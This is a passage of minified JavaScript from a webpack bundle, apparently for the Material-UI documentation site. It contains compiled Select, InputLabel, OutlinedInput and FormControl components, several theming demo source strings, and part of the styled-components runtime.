0===B?"hidden":B,H=e.value,z=e.variant,$=Object(r.a)(e,["autoFocus","autoWidth","children","classes","className","disabled","displayEmpty","IconComponent","inputRef","MenuProps","multiple","name","onBlur","onChange","onClose","onFocus","onOpen","open","readOnly","renderValue","required","SelectDisplayProps","tabIndex","type","value","variant"]),W=a.a.useRef(null),L=a.a.useRef(null),J=a.a.useRef(!1),q=a.a.useRef(null!=A).current,U=a.a.useState(),G=U[0],Y=U[1],_=a.a.useState(!1),X=_[0],V=_[1],K=a.a.useState(0)[1],Z=Object(f.c)(n,j);a.a.useImperativeHandle(Z,function(){return{focus:function(){L.current.focus()},node:W.current,value:H}},[H]),a.a.useEffect(function(){q&&A&&(L.current.focus(),K(function(e){return!e})),t&&L.current.focus()},[t,q,A]);var Q,ee,ne=function(e,n){e?M&&M(n):N&&N(n),q||(Y(o?null:L.current.clientWidth),V(e))},te=function(e){return function(n){if(P||ne(!1,n),k){var t;if(P){t=u()(H)?Object(c.default)(H):[];var s=H.indexOf(e.props.value);-1===s?t.push(e.props.value):t.splice(s,1)}else t=e.props.value;n.persist(),n.target={value:t,name:T},k(n,e)}}},se=q&&L.current?A:X;delete $["aria-invalid"];var re=[],oe=!1;(Object(h.b)(e)||v)&&(D?Q=D(H):oe=!0);var ae=a.a.Children.map(i,function(e){if(!a.a.isValidElement(e))return null;var n;if(P){if(!u()(H))throw new Error("Material-UI: the `value` prop must be an array when using the `Select` component with `multiple`.");(n=H.some(function(n){return g(n,e.props.value)}))&&oe&&re.push(e.props.children)}else(n=g(H,e.props.value))&&oe&&(ee=e.props.children);return a.a.cloneElement(e,{"aria-selected":n?"true":void 0,onClick:te(e),role:"option",selected:n,value:void 0,"data-value":e.props.value})});oe&&(Q=P?re.join(", "):ee);var ie,le=G;return!o&&q&&L.current&&(le=L.current.clientWidth),ie=void 0!==R?R:b?null:0,a.a.createElement(a.a.Fragment,null,a.a.createElement("div",Object(l.default)({className:Object(m.a)(d.root,d.select,d.selectMenu,y,b&&d.disabled,{filled:d.filled,outlined:d.outlined}[z]),ref:L,tabIndex:ie,role:"button","aria-expanded":se?"true":void 0,"aria-haspopup":"listbox","aria-owns":se?"menu-".concat(T||""):void 0,onKeyDown:function(e){I||-1!==[" ","ArrowUp","ArrowDown","Enter"].indexOf(e.key)&&(e.preventDefault(),J.current=!0,ne(!0,e))},onBlur:function(e){if(!0===J.current)return e.stopPropagation(),void(J.current=!1);C&&(e.persist(),e.target={value:H,name:T},C(e))},onClick:b||I?null:function(e){J.current=!0,ne(!0,e)},onFocus:O,id:T?"select-".concat(T):void 0},E),function(e){return null==e||"string"==typeof e&&!e.trim()}(Q)?a.a.createElement("span",{dangerouslySetInnerHTML:{__html:"&#8203;"}}):Q),a.a.createElement("input",Object(l.default)({value:u()(H)?H.join(","):H,name:T,ref:W,type:F,autoFocus:t},$)),a.a.createElement(S,{className:d.icon}),a.a.createElement(p.a,Object(l.default)({id:"menu-".concat(T||""),anchorEl:L.current,open:se,onClose:function(e){ne(!1,e)}},x,{MenuListProps:Object(s.a)({role:"listbox",disableListWrap:!0},x.MenuListProps),PaperProps:Object(s.a)({},x.PaperProps,{style:Object(s.a)({minWidth:le},null!=x.PaperProps?x.PaperProps.style:null)})}),ae))}),b=t("ADfD"),v=t("Hg0Q"),S=t("XpU0"),j=t("ny+v"),w=t("dml9"),x=t("kLTm"),P=t("CWZi"),T=x.b,C=a.a.createElement(w.a,null),k=a.a.forwardRef(function e(n,t){var o=n.autoWidth,l=void 0!==o&&o,c=n.children,d=n.classes,u=n.displayEmpty,m=void 0!==u&&u,p=n.IconComponent,h=void 0===p?j.a:p,f=n.input,g=void 0===f?C:f,S=n.inputProps,w=n.MenuProps,x=n.multiple,T=void 0!==x&&x,k=n.native,N=void 0!==k&&k,O=n.onClose,M=n.onOpen,A=n.open,I=n.renderValue,D=n.SelectDisplayProps,E=(n.variant,Object(r.a)(n,["autoWidth","children","classes","displayEmpty","IconComponent","input","inputProps","MenuProps","multiple","native","onClose","onOpen","open","renderValue","SelectDisplayProps","variant"])),R=N?P.a:y,B=Object(v.a)(),F=Object(b.a)({props:n,muiFormControl:B,states:["variant"]});return a.a.cloneElement(g,Object(s.a)({inputComponent:R,select:!0,inputProps:Object(s.a)({children:c,IconComponent:h,variant:F.variant,type:void 0,multiple:T},N?{}:{autoWidth:l,displayEmpty:m,MenuProps:w,onClose:O,onOpen:M,open:A,renderValue:I,SelectDisplayProps:D},S,{classes:S?Object(i.a)({baseClasses:d,newClasses:S.classes,Component:e}):d},g?g.props.inputProps:{}),ref:t},E))});k.muiName="Select";n.a=Object(S.default)(T,{name:"MuiSelect"})(k)},CWZi:function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("PDtE"),l=a.a.forwardRef(function(e,n){var t=e.classes,o=e.className,l=e.disabled,c=e.IconComponent,d=e.inputRef,u=e.variant,m=Object(r.a)(e,["classes","className","disabled","IconComponent","inputRef","variant"]);return a.a.createElement(a.a.Fragment,null,a.a.createElement("select",Object(s.default)({className:Object(i.a)(t.root,t.select,o,l&&t.disabled,{filled:t.filled,outlined:t.outlined}[u]),disabled:l,ref:d||n},m)),e.multiple?null:a.a.createElement(c,{className:t.icon}))});n.a=l},EhcO:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, WithTheme as WithThemeProps, withTheme } from '@material-ui/styles';\n\ninterface Theme {\n  spacing: string;\n}\n\ninterface Props extends WithThemeProps<Theme> {}\n\nfunction DeepChildRaw(props: Props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme<Theme, typeof DeepChildRaw>(DeepChildRaw);\n\nfunction WithTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n\nexport default WithTheme;\n"},F9ty:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, makeStyles, createStyles } from '@material-ui/styles';\n\ninterface MyTheme {\n  background: string;\n  boxShadow: string;\n}\n\nconst useStyles = makeStyles((theme: MyTheme) =>\n  createStyles({\n    root: {\n      background: theme.background,\n      border: 0,\n      fontSize: 16,\n      borderRadius: 3,\n      boxShadow: theme.boxShadow,\n      color: 'white',\n      height: 48,\n      padding: '0 30px',\n    },\n  }),\n);\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theme nesting\n    </button>\n  );\n}\n\nexport default function ThemeNesting() {\n  return (\n    <div>\n      <ThemeProvider<MyTheme>\n        theme={{\n          background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n          boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n        }}\n      >\n        <DeepChild />\n        <br />\n        <br />\n        <ThemeProvider<MyTheme>\n          theme={outerTheme => ({\n            ...outerTheme,\n            background: 'linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)',\n            boxShadow: '0 3px 5px 2px rgba(33, 203, 243, .3)',\n          })}\n        >\n          <DeepChild />\n        </ThemeProvider>\n      </ThemeProvider>\n    </div>\n  );\n}\n"},GwwO:function(e,n,t){e.exports=function(){"use strict";return function(e){function n(n){if(n)try{e(n+"}")}catch(t){}}return function(t,s,r,o,a,i,l,c,d,u){switch(t){case 1:if(0===d&&64===s.charCodeAt(0))return e(s+";"),"";break;case 2:if(0===c)return s+"/*|*/";break;case 3:switch(c){case 102:case 112:return e(r[0]+s),"";default:return s+(0===u?"/*|*/":"")}case-2:s.split("/*|*/}").forEach(n)}}}}()},HcJu:function(e,n){e.exports="import React from 'react';\nimport styled from 'styled-components';\nimport { TextField, NoSsr } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n`;\n\nexport default function GlobalClassName() {\n  return (\n    <NoSsr>\n      <StyledTextField label=\"Deterministic\" variant=\"outlined\" id=\"deterministic-outlined-input\" />\n    </NoSsr>\n  );\n}\n"},Hg0Q:function(e,n,t){"use strict";t.d(n,"a",function(){return a});var s=t("mXGw"),r=t.n(s),o=t("zpLS");function a(){return r.a.useContext(o.a)}},I5QN:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles(theme => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: theme.boxShadow,\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theme nesting\n    </button>\n  );\n}\n\nexport default function ThemeNesting() {\n  return (\n    <div>\n      <ThemeProvider\n        theme={{\n          background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n          boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n        }}\n      >\n        <DeepChild />\n        <br />\n        <br />\n        <ThemeProvider\n          theme={outerTheme => ({\n            ...outerTheme,\n            background: 'linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)',\n            boxShadow: '0 3px 5px 2px rgba(33, 203, 243, .3)',\n          })}\n        >\n          <DeepChild />\n        </ThemeProvider>\n      </ThemeProvider>\n    </div>\n  );\n}\n"},IZzF:function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("PDtE"),l=t("ADfD"),c=t("Hg0Q"),d=t("XpU0"),u=t("7RiP"),m=a.a.forwardRef(function(e,n){var t=e.classes,o=e.className,d=e.disableAnimation,m=void 0!==d&&d,p=(e.margin,e.shrink),h=(e.variant,Object(r.a)(e,["classes","className","disableAnimation","margin","shrink","variant"])),f=Object(c.a)(),g=p;void 0===g&&f&&(g=f.filled||f.focused||f.adornedStart);var y=Object(l.a)({props:e,muiFormControl:f,states:["margin","variant"]});return a.a.createElement(u.a,Object(s.default)({"data-shrink":g,className:Object(i.a)(t.root,o,f&&t.formControl,!m&&t.animated,g&&t.shrink,{dense:t.marginDense}[y.margin],{filled:t.filled,outlined:t.outlined}[y.variant]),classes:{focused:t.focused,disabled:t.disabled,error:t.error,required:t.required,asterisk:t.asterisk},ref:n},h))});n.a=Object(d.default)(function(e){return{root:{display:"block",transformOrigin:"top left"},focused:{},disabled:{},error:{},required:{},asterisk:{},formControl:{position:"absolute",left:0,top:0,transform:"translate(0, 24px) scale(1)"},marginDense:{transform:"translate(0, 21px) scale(1)"},shrink:{transform:"translate(0, 1.5px) scale(0.75)",transformOrigin:"top left"},animated:{transition:e.transitions.create(["color","transform"],{duration:e.transitions.duration.shorter,easing:e.transitions.easing.easeOut})},filled:{zIndex:1,pointerEvents:"none",transform:"translate(12px, 20px) scale(1)","&$marginDense":{transform:"translate(12px, 17px) scale(1)"},"&$shrink":{transform:"translate(12px, 10px) scale(0.75)","&$marginDense":{transform:"translate(12px, 7px) scale(0.75)"}}},outlined:{zIndex:1,pointerEvents:"none",transform:"translate(14px, 20px) scale(1)","&$marginDense":{transform:"translate(14px, 12px) scale(1)"},"&$shrink":{transform:"translate(14px, -6px) scale(0.75)"}}}},{name:"MuiInputLabel"})(m)},Jc26:function(e,n){e.exports="import React from 'react';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles({\n  '@global': {\n    '.cssjss-advanced-global-root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '.cssjss-advanced-global-child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function GlobalCss() {\n  useStyles();\n\n  return (\n    <div className=\"cssjss-advanced-global-root\">\n      <div className=\"cssjss-advanced-global-child\" />\n    </div>\n  );\n}\n"},K8BI:function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return c});var s=t("mXGw"),r=t.n(s),o=t("3O2h"),a=t("h7Hf"),i=Object(o.a)(function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)",color:"white",height:48,padding:"0 30px"}}});var l=r.a.createElement(a.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)"}},r.a.createElement(function(){var e=i();return r.a.createElement("button",{type:"button",className:e.root},"Theming")},null));function c(){return l}},Lv62:function(e,n,t){"use strict";var s=t("z3IF"),r=t("Rbzu"),o=t("2Fjn"),a=t("mXGw"),i=t.n(a),l=t("PDtE"),c=t("c3Nm"),d=t("azxR"),u=t("XpU0"),m=t("LMpM"),p=t("GbnF"),h=i.a.forwardRef(function(e,n){e.children;var t=e.classes,a=e.className,c=e.labelWidth,u=e.notched,h=e.style,f=Object(o.a)(e,["children","classes","className","labelWidth","notched","style"]),g="rtl"===Object(m.a)().direction?"right":"left",y=c>0?.75*c+8:0;return i.a.createElement("fieldset",Object(s.default)({"aria-hidden":!0,style:Object(r.a)(Object(d.a)({},"padding".concat(Object(p.a)(g)),8+(u?0:y/2)),h),className:Object(l.a)(t.root,a),ref:n},f),i.a.createElement("legend",{className:t.legend,style:{width:u?y:.01}},i.a.createElement("span",{dangerouslySetInnerHTML:{__html:"&#8203;"}})))}),f=Object(u.default)(function(e){var n="rtl"===e.direction?"right":"left";return{root:{position:"absolute",bottom:0,right:0,top:-5,left:0,margin:0,padding:0,pointerEvents:"none",borderRadius:e.shape.borderRadius,borderStyle:"solid",borderWidth:1,transition:e.transitions.create(["padding-".concat(n),"border-color","border-width"],{duration:e.transitions.duration.shorter,easing:e.transitions.easing.easeOut})},legend:{textAlign:"left",padding:0,lineHeight:"11px",transition:e.transitions.create("width",{duration:e.transitions.duration.shorter,easing:e.transitions.easing.easeOut})}}},{name:"PrivateNotchedOutline"})(h),g=i.a.forwardRef(function(e,n){var t=e.classes,a=e.fullWidth,d=void 0!==a&&a,u=e.inputComponent,m=void 0===u?"input":u,p=e.labelWidth,h=void 0===p?0:p,g=e.multiline,y=void 0!==g&&g,b=e.notched,v=e.type,S=void 0===v?"text":v,j=Object(o.a)(e,["classes","fullWidth","inputComponent","labelWidth","multiline","notched","type"]);return i.a.createElement(c.a,Object(s.default)({renderSuffix:function(e){return i.a.createElement(f,{className:t.notchedOutline,labelWidth:h,notched:void 0!==b?b:Boolean(e.startAdornment||e.filled||e.focused)})},classes:Object(r.a)({},t,{root:Object(l.a)(t.root,t.underline),notchedOutline:null}),fullWidth:d,inputComponent:m,multiline:y,ref:n,type:S},j))});g.muiName="Input";n.a=Object(u.default)(function(e){var n="light"===e.palette.type?"rgba(0, 0, 0, 0.23)":"rgba(255, 255, 255, 0.23)";return{root:{position:"relative","&:hover $notchedOutline":{borderColor:e.palette.text.primary},"@media (hover: none)":{"&:hover $notchedOutline":{borderColor:n}},"&$focused $notchedOutline":{borderColor:e.palette.primary.main,borderWidth:2},"&$error $notchedOutline":{borderColor:e.palette.error.main},"&$disabled $notchedOutline":{borderColor:e.palette.action.disabled}},focused:{},disabled:{},adornedStart:{paddingLeft:14},adornedEnd:{paddingRight:14},error:{},marginDense:{},multiline:{padding:"18.5px 14px","&$marginDense":{paddingTop:10.5,paddingBottom:10.5}},notchedOutline:{borderColor:n},input:{padding:"18.5px 14px"},inputMarginDense:{paddingTop:10.5,paddingBottom:10.5},inputSelect:{paddingRight:24},inputMultiline:{padding:0},inputAdornedStart:{paddingLeft:0},inputAdornedEnd:{paddingRight:0}}},{name:"MuiOutlinedInput"})(g)},M8e6:function(e,n,t){"use strict";n.a=function(e){var n={};return function(t){return void 0===n[t]&&(n[t]=e(t)),n[t]}}},NLUw:function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return m});var s=t("kGIj"),r=t("mXGw"),o=t.n(r),a=t("UutA"),i=t("nx5Z"),l=t("WKBU");function c(){var e=Object(s.a)(["\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n"]);return c=function(){return e},e}var d=Object(a.b)(i.a)(c()),u=o.a.createElement(l.a,null,o.a.createElement(d,{label:"Deterministic",variant:"outlined",id:"deterministic-outlined-input"}));function m(){return u}},NrWm:function(e,n,t){"use strict";var s=t("M8e6"),r=/^((children|dangerouslySetInnerHTML|key|ref|autoFocus|defaultValue|defaultChecked|innerHTML|suppressContentEditableWarning|suppressHydrationWarning|valueLink|accept|acceptCharset|accessKey|action|allow|allowUserMedia|allowPaymentRequest|allowFullScreen|allowTransparency|alt|async|autoComplete|autoPlay|capture|cellPadding|cellSpacing|challenge|charSet|checked|cite|classID|className|cols|colSpan|content|contentEditable|contextMenu|controls|controlsList|coords|crossOrigin|data|dateTime|decoding|default|defer|dir|disabled|download|draggable|encType|form|formAction|formEncType|formMethod|formNoValidate|formTarget|frameBorder|headers|height|hidden|high|href|hrefLang|htmlFor|httpEquiv|id|inputMode|integrity|is|keyParams|keyType|kind|label|lang|list|loading|loop|low|marginHeight|marginWidth|max|maxLength|media|mediaGroup|method|min|minLength|multiple|muted|name|nonce|noValidate|open|optimum|pattern|placeholder|playsInline|poster|preload|profile|radioGroup|readOnly|referrerPolicy|rel|required|reversed|role|rows|rowSpan|sandbox|scope|scoped|scrolling|seamless|selected|shape|size|sizes|slot|span|spellCheck|src|srcDoc|srcLang|srcSet|start|step|style|summary|tabIndex|target|title|type|useMap|value|width|wmode|wrap|about|datatype|inlist|prefix|property|resource|typeof|vocab|autoCapitalize|autoCorrect|autoSave|color|itemProp|itemScope|itemType|itemID|itemRef|results|security|unselectable|accentHeight|accumulate|additive|alignmentBaseline|allowReorder|alphabetic|amplitude|arabicForm|ascent|attributeName|attributeType|autoReverse|azimuth|baseFrequency|baselineShift|baseProfile|bbox|begin|bias|by|calcMode|capHeight|clip|clipPathUnits|clipPath|clipRule|colorInterpolation|colorInterpolationFilters|colorProfile|colorRendering|contentScriptType|contentStyleType|cursor|cx|cy|d|decelerate|descent|diffuseConstant|direction|display|divisor|dominantBaseline|dur|dx|dy|edgeMode|elevation|enableBackground|end|exponent|externalResourcesRequired|fill|fillOpacity|fillRule|filter|filterRes|filterUnits|floodColor|floodOpacity|focusable|fontFamily|fontSize|fontSizeAdjust|fontStretch|fontStyle|fontVariant|fontWeight|format|from|fr|fx|fy|g1|g2|glyphName|glyphOrientationHorizontal|glyphOrientationVertical|glyphRef|gradientTransform|gradientUnits|hanging|horizAdvX|horizOriginX|ideographic|imageRendering|in|in2|intercept|k|k1|k2|k3|k4|kernelMatrix|kernelUnitLength|kerning|keyPoints|keySplines|keyTimes|lengthAdjust|letterSpacing|lightingColor|limitingConeAngle|local|markerEnd|markerMid|markerStart|markerHeight|markerUnits|markerWidth|mask|maskContentUnits|maskUnits|mathematical|mode|numOctaves|offset|opacity|operator|order|orient|orientation|origin|overflow|overlinePosition|overlineThickness|panose1|paintOrder|pathLength|patternContentUnits|patternTransform|patternUnits|pointerEvents|points|pointsAtX|pointsAtY|pointsAtZ|preserveAlpha|preserveAspectRatio|primitiveUnits|r|radius|refX|refY|renderingIntent|repeatCount|repeatDur|requiredExtensions|requiredFeatures|restart|result|rotate|rx|ry|scale|seed|shapeRendering|slope|spacing|specularConstant|specularExponent|speed|spreadMethod|startOffset|stdDeviation|stemh|stemv|stitchTiles|stopColor|stopOpacity|strikethroughPosition|strikethroughThickness|string|stroke|strokeDasharray|strokeDashoffset|strokeLinecap|strokeLinejoin|strokeMiterlimit|strokeOpacity|strokeWidth|surfaceScale|systemLanguage|tableValues|targetX|targetY|textAnchor|textDecoration|textRendering|textLength|to|transform|u1|u2|underlinePosition|underlineThickness|unicode|unicodeBidi|unicodeRange|unitsPerEm|vAlphabetic|vHanging|vIdeographic|vMathematical|values|vectorEffect|version|vertAdvY|vertOriginX|vertOriginY|viewBox|viewTarget|visibility|widths|wordSpacing|writingMode|x|xHeight|x1|x2|xChannelSelector|xlinkActuate|xlinkArcrole|xlinkHref|xlinkRole|xlinkShow|xlinkTitle|xlinkType|xmlBase|xmlns|xmlnsXlink|xmlLang|xmlSpace|y|y1|y2|yChannelSelector|z|zoomAndPan|for|class|autofocus)|(([Dd][Aa][Tt][Aa]|[Aa][Rr][Ii][Aa]|x)-.*))$/,o=Object(s.a)(function(e){return r.test(e)||111===e.charCodeAt(0)&&110===e.charCodeAt(1)&&e.charCodeAt(2)<91});n.a=o},Nulz:function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("PDtE"),l=(t("FIWN"),t("imrm")),c=t("XpU0"),d=t("GbnF"),u=t("c1Jj"),m=t("zpLS"),p=a.a.forwardRef(function(e,n){var t=e.children,o=e.classes,c=e.className,p=e.component,h=void 0===p?"div":p,f=e.disabled,g=void 0!==f&&f,y=e.error,b=void 0!==y&&y,v=e.fullWidth,S=void 0!==v&&v,j=e.hiddenLabel,w=void 0!==j&&j,x=e.margin,P=void 0===x?"none":x,T=e.required,C=void 0!==T&&T,k=e.variant,N=void 0===k?"standard":k,O=Object(r.a)(e,["children","classes","className","component","disabled","error","fullWidth","hiddenLabel","margin","required","variant"]),M=a.a.useState(function(){var e=!1;return t&&a.a.Children.forEach(t,function(n){if(Object(u.a)(n,["Input","Select"])){var t=Object(u.a)(n,["Select"])?n.props.input:n;t&&Object(l.a)(t.props)&&(e=!0)}}),e})[0],A=a.a.useState(function(){var e=!1;return t&&a.a.Children.forEach(t,function(n){Object(u.a)(n,["Input","Select"])&&Object(l.b)(n.props,!0)&&(e=!0)}),e}),I=A[0],D=A[1],E=a.a.useState(!1),R=E[0],B=E[1];g&&R&&B(!1);var F={adornedStart:M,disabled:g,error:b,filled:I,focused:R,hiddenLabel:w,margin:P,onBlur:function(){B(!1)},onEmpty:function(){I&&D(!1)},onFilled:function(){I||D(!0)},onFocus:function(){B(!0)},registerEffect:void 0,required:C,variant:N};return a.a.createElement(m.a.Provider,{value:F},a.a.createElement(h,Object(s.default)({className:Object(i.a)(o.root,c,"none"!==P&&o["margin".concat(Object(d.a)(P))],S&&o.fullWidth),ref:n},O),t))});n.a=Object(c.default)({root:{display:"inline-flex",flexDirection:"column",position:"relative",minWidth:0,padding:0,margin:0,border:0,verticalAlign:"top"},marginNormal:{marginTop:16,marginBottom:8},marginDense:{marginTop:8,marginBottom:4},fullWidth:{width:"100%"}},{name:"MuiFormControl"})(p)},Rsxw:function(e,n){e.exports="import React from 'react';\nimport PropTypes from 'prop-types';\nimport { ThemeProvider, withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nDeepChildRaw.propTypes = {\n  theme: PropTypes.shape({\n    spacing: PropTypes.string.isRequired,\n  }).isRequired,\n};\n\nconst DeepChild = withTheme(DeepChildRaw);\n\nfunction WithTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n\nexport default WithTheme;\n"},RuvM:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n\nexport default function UseTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},TunK:function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return c});var s=t("mXGw"),r=t.n(s),o=t("PDtE"),a=t("3O2h"),i=Object(a.a)({root:{"&.root":{height:100,width:100,backgroundColor:"blue"},"& .child":{height:8,backgroundColor:"red"}}}),l=r.a.createElement("div",{className:"child"});function c(){var e=i();return r.a.createElement("div",{className:Object(o.a)(e.root,"root")},l)}},UutA:function(e,n,t){"use strict";(function(e){t.d(n,"a",function(){return _e});var s=t("4XoQ"),r=t.n(s),o=t("GwwO"),a=t.n(o),i=t("mXGw"),l=t.n(i),c=t("Zxfz"),d=t("xVO4"),u=t("WpNh"),m=(t("W0B4"),t("NrWm")),p=t("gjvq"),h=function(e,n){for(var t=[e[0]],s=0,r=n.length;s<r;s+=1)t.push(n[s],e[s+1]);return t},f="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},g=function(e,n){if(!(e instanceof n))throw new TypeError("Cannot call a class as a function")},y=function(){function e(e,n){for(var t=0;t<n.length;t++){var s=n[t];s.enumerable=s.enumerable||!1,s.configurable=!0,"value"in s&&(s.writable=!0),Object.defineProperty(e,s.key,s)}}return function(n,t,s){return t&&e(n.prototype,t),s&&e(n,s),n}}(),b=Object.assign||function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},v=function(e,n){if("function"!=typeof n&&null!==n)throw new TypeError("Super expression must either be null or a function, not "+typeof n);e.prototype=Object.create(n&&n.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),n&&(Object.setPrototypeOf?Object.setPrototypeOf(e,n):e.__proto__=n)},S=function(e,n){var t={};for(var s in e)n.indexOf(s)>=0||Object.prototype.hasOwnProperty.call(e,s)&&(t[s]=e[s]);return t},j=function(e,n){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!n||"object"!=typeof n&&"function"!=typeof n?e:n},w=function(e){return"object"===(void 0===e?"undefined":f(e))&&e.constructor===Object},x=Object.freeze([]),P=Object.freeze({});function T(e){return"function"==typeof e}function C(e){return e.displayName||e.name||"Component"}function k(e){return e&&"string"==typeof e.styledComponentId}var N=void 0!==e&&(Object({LIB_VERSION:"4.3.3"}).REACT_APP_SC_ATTR||Object({LIB_VERSION:"4.3.3"}).SC_ATTR)||"data-styled",O="undefined"!=typeof window&&"HTMLElement"in window,M="boolean"==typeof SC_DISABLE_SPEEDY&&SC_DISABLE_SPEEDY||void 0!==e&&(Object({LIB_VERSION:"4.3.3"}).REACT_APP_SC_DISABLE_SPEEDY||Object({LIB_VERSION:"4.3.3"}).SC_DISABLE_SPEEDY)||!1;var A=function(e){function n(t){g(this,n);for(var s=arguments.length,r=Array(s>1?s-1:0),o=1;o<s;o++)r[o-1]=arguments[o];var a=j(this,e.call(this,"An error occurred. See https://github.com/styled-components/styled-components/blob/master/packages/styled-components/src/utils/errors.md#"+t+" for more information."+(r.length>0?" Additional arguments: "+r.join(", "):"")));return j(a)}return v(n,e),n}(Error),I=/^[^\S\n]*?\/\* sc-component-id:\s*(\S+)\s+\*\//gm,D=function(e){var n=""+(e||""),t=[];return n.replace(I,function(e,n,s){return t.push({componentId:n,matchIndex:s}),e}),t.map(function(e,s){var r=e.componentId,o=e.matchIndex,a=t[s+1];return{componentId:r,cssFromDOM:a?n.slice(o,a.matchIndex):n.slice(o)}})},E=/^\s*\/\/.*$/gm,R=new r.a({global:!1,cascade:!0,keyframe:!1,prefix:!1,compress:!1,semicolon:!0}),B=new r.a({global:!1,cascade:!0,keyframe:!1,prefix:!0,compress:!1,semicolon:!1}),F=[],H=function(e){if(-2===e){var n=F;return F=[],n}},z=a()(function(e){F.push(e)}),$=void 0,W=void 0,L=void 0,J=function(e,n,t){return n>0&&-1!==t.slice(0,n).indexOf(W)&&t.slice(n-W.length,n)!==W?"."+$:e};B.use([function(e,n,t){2===e&&t.length&&t[0].lastIndexOf(W)>0&&(t[0]=t[0].replace(L,J))},z,H]),R.use([z,H]);var q=function(e){return R("",e)};function U(e,n,t){var s=arguments.length>3&&void 0!==arguments[3]?arguments[3]:"&",r=e.join("").replace(E,""),o=n&&t?t+" "+n+" { "+r+" }":r;return $=s,W=n,L=new RegExp("\\"+W+"\\b","g"),B(t||!n?"":n,o)}var G=function(){return t.nc},Y=function(e,n,t){t&&((e[n]||(e[n]=Object.create(null)))[t]=!0)},_=function(e,n){e[n]=Object.create(null)},X=function(e){return function(n,t){return void 0!==e[n]&&e[n][t]}},V=function(e){var n="";for(var t in e)n+=Object.keys(e[t]).join(" ")+" ";return n.trim()},K=function(e){if(e.sheet)return e.sheet;for(var n=document.styleSheets.length,t=0;t<n;t+=1){var s=document.styleSheets[t];if(s.ownerNode===e)return s}throw new A(10)},Z=function(e,n,t){if(!n)return!1;var s=e.cssRules.length;try{e.insertRule(n,t<=s?t:s)}catch(r){return!1}return!0},Q=function(e){return"\n/* sc-component-id: "+e+" */\n"},ee=function(e,n){for(var t=0,s=0;s<=n;s+=1)t+=e[s];return t},ne=function(e,n){return function(t){var s=G();return"<style "+[s&&'nonce="'+s+'"',N+'="'+V(n)+'"','data-styled-version="4.3.2"',t].filter(Boolean).join(" ")+">"+e()+"</style>"}},te=function(e,n){return function(){var t,s=((t={})[N]=V(n),t["data-styled-version"]="4.3.2",t),r=G();return r&&(s.nonce=r),l.a.createElement("style",b({},s,{dangerouslySetInnerHTML:{__html:e()}}))}},se=function(e){return function(){return Object.keys(e)}},re=function(e){return document.createTextNode(Q(e))},oe=function e(n,t){var s=void 0===n?Object.create(null):n,r=void 0===t?Object.create(null):t,o=function(e){var n=r[e];return void 0!==n?n:r[e]=[""]},a=function(){var e="";for(var n in r){var t=r[n][0];t&&(e+=Q(n)+t)}return e};return{clone:function(){var n=function(e){var n=Object.create(null);for(var t in e)n[t]=b({},e[t]);return n}(s),t=Object.create(null);for(var o in 